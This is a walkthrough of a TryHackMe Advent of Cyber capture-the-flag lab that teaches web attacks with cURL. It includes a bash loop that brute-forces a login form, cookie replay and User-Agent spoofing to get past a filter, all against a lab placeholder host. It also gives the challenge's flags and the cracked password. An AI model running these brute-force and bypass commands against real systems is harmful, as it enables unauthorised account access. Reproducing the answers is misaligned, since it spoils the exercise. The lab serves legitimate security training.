# 🎄 TryHackMe Advent of Cyber 2025  
## Day 24 — Exploitation with cURL: Hoperation Eggsploit

### 🐰 Command-Line Web Exploitation Using cURL

This challenge focuses on using **cURL from the command line** to interact with web applications, simulate browser behaviour, manage sessions, perform brute-force attempts, and bypass security checks. By understanding how HTTP requests work at a low level, we can identify authentication flaws, replay cookies, and automate attacks without a browser.

---

## 🧰 Skills & Techniques Covered

- Sending **GET & POST HTTP requests**
- Submitting login forms using `-d` and `-X POST`
- Viewing server responses & headers with `-i`
- Saving and reusing **session cookies**
- Automating brute-force attempts using **Bash loops**
- Bypassing **User-Agent filtering**
- Understanding how tools like Hydra & Burp Intruder work internally

---

## 🧪 Practical Walkthrough

### ✅ Step 1 — Basic HTTP Request with cURL

curl http://MACHINE_IP/
Displays the raw HTML of the page in the terminal.

✅ Step 2 — Sending a POST Login Request

curl -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
The server validates form data just as if submitted via a browser.

✅ Step 3 — Viewing Response Headers

curl -i -X POST -d "username=admin&password=admin" http://MACHINE_IP/post.php
Headers reveal:

redirects

cookies

session tokens

✅ Step 4 — Handling Cookies (Session Persistence)
Save cookies:

curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/cookie.php
Reuse cookies:

curl -b cookies.txt http://MACHINE_IP/cookie.php
This simulates authenticated session reuse.

✅ Step 5 — Automating Brute Force with Bash + cURL
passwords.txt

admin123
password
letmein
secretpass
secret
loop.sh

for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
Run it:

chmod +x loop.sh
./loop.sh
✔ Demonstrates manual brute-force mechanics

✅ Step 6 — Bypassing User-Agent Filtering

curl -A "TBFC" http://MACHINE_IP/agent.php
Spoofs a trusted client identity.

🚩 Challenge Answers
Question	Answer
Make a POST request to /post.php	THM{curl_post_success}
Reuse session cookie on /cookie.php	THM{session_cookie_master}
Password found after brute force	secretpass
Bypass user-agent filter on /agent.php	THM{user_agent_filter_bypassed}
Final bonus mission	No answer required

🛡️ Key Security Lessons
HTTP-level testing reveals real-world weaknesses

Sessions can be exploited if cookies aren’t protected

Brute-force attacks are trivial without:

rate-limiting

account lockout

CAPTCHA

User-Agent validation is not security

Always validate requests server-side

✅ Room Summary
This exercise reinforces hands-on knowledge of:

HTTP behaviour

Web exploitation techniques

Manual attack automation

Real-world offensive testing workflows

Understanding how requests function behind the browser makes you a stronger penetration tester & defender.
